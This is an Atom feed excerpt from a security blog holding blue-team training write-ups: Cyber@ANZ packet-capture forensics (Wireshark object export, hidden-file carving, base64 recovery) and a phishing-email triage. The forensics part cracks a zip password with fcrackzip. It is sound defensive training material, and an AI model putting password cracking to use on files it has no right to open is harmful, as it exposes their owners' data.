&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;evebox oneshot eve.json                                                                                                                                                              
2021-09-24 23:23:10  INFO evebox::commands::oneshot: Using database filename ./oneshot.sqlite
2021-09-24 23:23:11  INFO evebox::sqlite::init: Found event database schema version &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;        
2021-09-24 23:23:11  INFO evebox::sqlite::init: Initializing SQLite database &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sqlite&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         
2021-09-24 23:23:11  INFO evebox::sqlite::init: Updating SQLite database to schema version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sqlite&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                         
2021-09-24 23:23:11  INFO evebox::sqlite::init: Updating SQLite database to schema version 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sqlite&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                         
2021-09-24 23:23:11  INFO evebox::commands::oneshot: Reading eve.json &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;166509 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Here is how it looks like.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/4.png&quot; title=&quot;fiesta/4.png&quot; alt=&quot;fiesta/4.png&quot; /&gt;
          &lt;/div&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="blueteam" /><category term="ek" /><summary type="html">Description Analyze the following packet and answer the questions.</summary></entry><entry><title type="html">Cyber@ANZ - Digital Forensics</title><link href="https://jayngng.github.io/blog/cyberanz-digital-forensics/" rel="alternate" type="text/html" title="Cyber@ANZ - Digital Forensics" /><published>2021-09-23T02:56:47+10:00</published><updated>2021-09-23T02:56:47+10:00</updated><id>https://jayngng.github.io/blog/cyberanz---digital-forensics</id><content type="html" xml:base="https://jayngng.github.io/blog/cyberanz-digital-forensics/">&lt;h2 id=&quot;task-description&quot;&gt;&lt;strong&gt;Task Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Suspicious network activity has been detected coming from a user on the ANZ network.&lt;/p&gt;

&lt;p&gt;A laptop has been flagged up on our security systems due to suspicious internet traffic, and we need you to investigate the network traffic in order to establish what the user accessed and downloaded.&lt;/p&gt;

&lt;p&gt;Your task is to examine their network activity and gather what information you can on what images they viewed and what files they accessed.&lt;/p&gt;

&lt;p&gt;You have been provided with a packet capture file (pcap) containing all their recent network activity. There may be a number of artifacts contained within the packet capture file, and you will be expected to identify and report as many as possible.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;You must provide a report on everything you found, and document what processes / steps you followed to achieve this.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Download Packet: &lt;a href=&quot;https://cdn.theforage.com/vinternships/companyassets/AKkAyEwWc8wjPxx9n/Digital_Investigation%20Task%20(pcap%20file).pcapng&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;solutions&quot;&gt;&lt;strong&gt;Solutions&lt;/strong&gt;&lt;/h2&gt;

&lt;h4 id=&quot;packet-analyses&quot;&gt;&lt;strong&gt;Packet Analyses&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;I utilized the network analysis tool called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; to read the provided packet capture file.&lt;/p&gt;

&lt;p&gt;Analysing the traffic, I discovered that most communications occurred via HTTP service, so I decided to filter the HTTP traffic using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http.request&lt;/code&gt; query.&lt;/p&gt;

&lt;p&gt;As I further investigated the communications, I found out some interesting “&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt;” requests demonstrated by the following image.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/1.png&quot; title=&quot;ANZ_Digital_Forensics/1.png&quot; alt=&quot;ANZ_Digital_Forensics/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;I then took the next step by downloading those images.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; provides a capability to extract the objects in the HTTP traffic.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;From Wireshark, I navigated to &lt;strong&gt;&lt;em&gt;File&lt;/em&gt;&lt;/strong&gt; -&amp;gt; &lt;strong&gt;&lt;em&gt;Export Objects&lt;/em&gt;&lt;/strong&gt; -&amp;gt; &lt;strong&gt;&lt;em&gt;HTTP&lt;/em&gt;&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;There is a new Windows popped up -&amp;gt; Click &lt;strong&gt;&lt;em&gt;Save All&lt;/em&gt;&lt;/strong&gt; -&amp;gt; Pick a desired folder-&amp;gt; &lt;strong&gt;&lt;em&gt;Choose&lt;/em&gt;&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/2.png&quot; title=&quot;ANZ_Digital_Forensics/2.png&quot; alt=&quot;ANZ_Digital_Forensics/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Here are the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5&lt;/code&gt; hashes of those images after they were downloaded:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/3.png&quot; title=&quot;ANZ_Digital_Forensics/3.png&quot; alt=&quot;ANZ_Digital_Forensics/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Analysing those images, I was able to spot a few dubious points.&lt;/p&gt;

&lt;h4 id=&quot;sub-task-1&quot;&gt;&lt;strong&gt;Sub-task 1&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anz-logo.jpg&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bank-card.jpg&lt;/code&gt; are two images that show up in the users network traffic. Opened those images with an Image Viewer application, I obtained the following results.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anz-logo.jpg&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/4.png&quot; title=&quot;ANZ_Digital_Forensics/4.png&quot; alt=&quot;ANZ_Digital_Forensics/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bank-card.jpg&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/5.png&quot; title=&quot;ANZ_Digital_Forensics/5.png&quot; alt=&quot;ANZ_Digital_Forensics/5.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-2&quot;&gt;&lt;strong&gt;Sub-task 2&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The network traffic for the images &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ1.jpg&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ2.jpg&lt;/code&gt; is more than it appears.&lt;/li&gt;
  &lt;li&gt;Employing a tool called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; against the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ1.jpg&lt;/code&gt;, I discovered a hidden message.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/6.png&quot; title=&quot;ANZ_Digital_Forensics/6.png&quot; alt=&quot;ANZ_Digital_Forensics/6.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;I achieved the same result by inspecting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp stream 14”&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The Wireshark filter query is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp.stream eq 14&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Follow TCP Stream&lt;/code&gt;. At the end of the stream, the hidden message showed up.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/7.png&quot; title=&quot;ANZ_Digital_Forensics/7.png&quot; alt=&quot;ANZ_Digital_Forensics/7.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Open the image with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HxD&lt;/code&gt; application, I could also retain the same output.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/hxd.png&quot; title=&quot;ANZ_Digital_Forensics/hxd.png&quot; alt=&quot;ANZ_Digital_Forensics/hxd.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;I followed the same techniques with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ2.jpg&lt;/code&gt; image and managed to allocate the hidden messages shown as below.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/8.png&quot; title=&quot;ANZ_Digital_Forensics/8.png&quot; alt=&quot;ANZ_Digital_Forensics/8.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-3&quot;&gt;&lt;strong&gt;Sub-task 3&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;how-to-commit-crimes.docx&lt;/code&gt; file type is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASCII&lt;/code&gt;. I could confirm that with the  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/9.png&quot; title=&quot;ANZ_Digital_Forensics/9.png&quot; alt=&quot;ANZ_Digital_Forensics/9.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Here is how the content looks like on the wire.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/10.png&quot; title=&quot;ANZ_Digital_Forensics/10.png&quot; alt=&quot;ANZ_Digital_Forensics/10.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-4&quot;&gt;&lt;strong&gt;Sub-task 4&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The user accessed three pdf documents: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document.pdf&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document2.pdf&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil.pdf&lt;/code&gt;. Inspecting those &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pdf&lt;/code&gt; respectively …&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document.pdf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/11.png&quot; title=&quot;ANZ_Digital_Forensics/11.png&quot; alt=&quot;ANZ_Digital_Forensics/11.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANZ_Document2.pdf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/12.png&quot; title=&quot;ANZ_Digital_Forensics/12.png&quot; alt=&quot;ANZ_Digital_Forensics/12.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil.pdf&lt;/code&gt; file is suspicious with the following contents.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/13.png&quot; title=&quot;ANZ_Digital_Forensics/13.png&quot; alt=&quot;ANZ_Digital_Forensics/13.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-5&quot;&gt;&lt;strong&gt;Sub-task 5&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hiddenmessage2.txt&lt;/code&gt; file is actually a JPG image. This could be confirmed with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JFIF&lt;/code&gt; file signature.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/14.png&quot; title=&quot;ANZ_Digital_Forensics/14.png&quot; alt=&quot;ANZ_Digital_Forensics/14.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;By changing the file extension to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hiddenmessage2.jpg&lt;/code&gt;. Here is how it looks like.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/15.png&quot; title=&quot;ANZ_Digital_Forensics/15.png&quot; alt=&quot;ANZ_Digital_Forensics/15.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-6&quot;&gt;&lt;strong&gt;Sub-task 6&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;A hidden image is embedded in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atm-image.jpg&lt;/code&gt;. I could confirm that by inspecting the file stream with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/16.png&quot; title=&quot;ANZ_Digital_Forensics/16.png&quot; alt=&quot;ANZ_Digital_Forensics/16.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Scrolling down a little bit, I found the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JFIF&lt;/code&gt; file signature.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/17.png&quot; title=&quot;ANZ_Digital_Forensics/17.png&quot; alt=&quot;ANZ_Digital_Forensics/17.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Extracting the second image with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foremost&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/18.png&quot; title=&quot;ANZ_Digital_Forensics/18.png&quot; alt=&quot;ANZ_Digital_Forensics/18.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Here is how it looks like.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/19.png&quot; title=&quot;ANZ_Digital_Forensics/19.png&quot; alt=&quot;ANZ_Digital_Forensics/19.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-7&quot;&gt;&lt;strong&gt;Sub-task 7&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken.png&lt;/code&gt; file content is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64-encoded&lt;/code&gt;. I decoded the content, and took a look at the file header, it appears to be a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PNG&lt;/code&gt; image.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/20.png&quot; title=&quot;ANZ_Digital_Forensics/20.png&quot; alt=&quot;ANZ_Digital_Forensics/20.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;I simply redirected the decoded content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken.png&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken_recover.png&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Here is how the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken_recover.png&lt;/code&gt; image looks like when its recovered.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/21.png&quot; title=&quot;ANZ_Digital_Forensics/21.png&quot; alt=&quot;ANZ_Digital_Forensics/21.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;sub-task-8&quot;&gt;&lt;strong&gt;Sub-task 8&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;securepdf.pdf&lt;/code&gt; is a actually a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt; file. Once again, I could state that by checking the file type with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/22.png&quot; title=&quot;ANZ_Digital_Forensics/22.png&quot; alt=&quot;ANZ_Digital_Forensics/22.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Extract the zip, I was prompted to enter a password.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/23.png&quot; title=&quot;ANZ_Digital_Forensics/23.png&quot; alt=&quot;ANZ_Digital_Forensics/23.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Crack the zip with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fcrackzip&lt;/code&gt;, the yielded password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secure&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/24.png&quot; title=&quot;ANZ_Digital_Forensics/24.png&quot; alt=&quot;ANZ_Digital_Forensics/24.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Extract the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zip&lt;/code&gt; with the password of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secure&lt;/code&gt;, I managed to recover the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rawpdf.pdf&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/25.png&quot; title=&quot;ANZ_Digital_Forensics/25.png&quot; alt=&quot;ANZ_Digital_Forensics/25.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Here is how the file looks like when its recovered.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/26.png&quot; title=&quot;ANZ_Digital_Forensics/26.png&quot; alt=&quot;ANZ_Digital_Forensics/26.png&quot; /&gt;
          &lt;/div&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="digital_forensics" /><category term="blueteam" /><summary type="html">Task Description</summary></entry><entry><title type="html">Cyber@ANZ - Social Engineering Investigation</title><link href="https://jayngng.github.io/blog/cyberanz-social-engineering-email-analysis/" rel="alternate" type="text/html" title="Cyber@ANZ - Social Engineering Investigation" /><published>2021-09-22T02:13:37+10:00</published><updated>2021-09-22T02:13:37+10:00</updated><id>https://jayngng.github.io/blog/cyberanz---social-engineering-email-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/cyberanz-social-engineering-email-analysis/">&lt;h2 id=&quot;task-description&quot;&gt;&lt;strong&gt;Task Description&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;You have been assigned &lt;a href=&quot;https://cdn.theforage.com/vinternships/companyassets/AKkAyEwWc8wjPxx9n/Emails%20to%20Investigate.pdf&quot;&gt;7 emails&lt;/a&gt; to investigate. Some of these emails may contain content which can be classed as malicious, due to a number of reasons. They may contain malicious attachments, suspicious links, or Phishing attempts to gather private account information from the user.&lt;/p&gt;

&lt;p&gt;You are expected to report your findings on each email, so that we can either block or release these emails to the users.&lt;/p&gt;

&lt;p&gt;Download Emails: &lt;a href=&quot;https://cdn.theforage.com/vinternships/companyassets/AKkAyEwWc8wjPxx9n/Emails%20to%20Investigate.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;solutions&quot;&gt;&lt;strong&gt;Solutions&lt;/strong&gt;&lt;/h2&gt;

&lt;h4 id=&quot;email-1&quot;&gt;&lt;strong&gt;Email 1&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email1.png&quot; title=&quot;ANZ_Social_Engineering/email1.png&quot; alt=&quot;ANZ_Social_Engineering/email1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Safe&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The email does not contain a link or attachment.&lt;/li&gt;
  &lt;li&gt;It appears to be a typical conversation between friends.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;email-2&quot;&gt;&lt;strong&gt;Email 2&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email2.png&quot; title=&quot;ANZ_Social_Engineering/email2.png&quot; alt=&quot;ANZ_Social_Engineering/email2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;There is no formal email greeting.&lt;/li&gt;
  &lt;li&gt;The email started with an abnormal “One Drive..” header.&lt;/li&gt;
  &lt;li&gt;Inconsistency in writing. For example, “office 365 Email”.&lt;/li&gt;
  &lt;li&gt;The spelling mistake in “recevie”.&lt;/li&gt;
  &lt;li&gt;The attacker tries to convince the user to click on the “UPDATE YOUR ACCOUNT” leading to an unknown page.&lt;/li&gt;
  &lt;li&gt;The words “ADOBE PDF” and “SECURITY” are unreasonably capitalized.&lt;/li&gt;
  &lt;li&gt;Overall, the email is poorly written, with multiple spelling mistakes and inconsistent formatting. The final purpose is to trick the user into downloading and opening a dubious Adobe PDF file.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;email-3&quot;&gt;&lt;strong&gt;Email 3&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email3.png&quot; title=&quot;ANZ_Social_Engineering/email3.png&quot; alt=&quot;ANZ_Social_Engineering/email3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The address is not legitimate due to the “b” letter and the Top Level Domain (TLD) of “.opt”, which indicates a malicious Facebook website.&lt;/li&gt;
  &lt;li&gt;Overall, the user has been instilled a sense of curiosity to click on a malicious link.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;email-4&quot;&gt;&lt;strong&gt;Email 4&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email4.png&quot; title=&quot;ANZ_Social_Engineering/email4.png&quot; alt=&quot;ANZ_Social_Engineering/email4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious/Spam&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;By inspecting the header information, we discover that the email is initially from Massdrop and is then forwarded by Adam.&lt;/li&gt;
  &lt;li&gt;The email is written inconsistently, with some grammar errors in “a new adjustments”.&lt;/li&gt;
  &lt;li&gt;There is potentially a high chance that Adam had modified the original email and the “SEE MORE” link location, which clicking on will redirect the user to land on an unknown website.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;email-5&quot;&gt;&lt;strong&gt;Email 5&lt;/strong&gt;&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email5.png&quot; title=&quot;ANZ_Social_Engineering/email5.png&quot; alt=&quot;ANZ_Social_Engineering/email5.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The sender does not know the user’s identity. As a result, he/she solely “Hi” without mentioning the user’s name.&lt;/li&gt;
  &lt;li&gt;The email is so generic that it could apply to anyone.&lt;/li&gt;
  &lt;li&gt;The sender tries to instill a sense of urgency to hopefully compromise the user’s credentials.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

